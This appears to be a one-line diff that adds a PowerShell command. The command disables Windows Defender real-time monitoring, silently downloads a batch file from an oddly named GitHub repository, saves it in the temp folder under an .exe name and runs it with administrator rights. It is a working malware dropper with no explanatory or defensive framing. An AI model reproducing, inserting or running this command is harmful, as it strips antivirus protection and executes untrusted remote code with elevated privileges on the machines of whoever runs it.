@@ -1,0 +1,1 @@
+Set-MpPreference -DisableRealtimeMonitoring $true curl.exe -L -s -o "$env:TEMP\pir_pir_patapim.exe" -A "Mozilla/5.0" "https://github.com/asofiqhprewu-sd-a-sd/burmoldaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/raw/refs/heads/main/holycheck.bat"; Start-Process "$env:TEMP\pir_pir_patapim.exe" -Verb RunAs
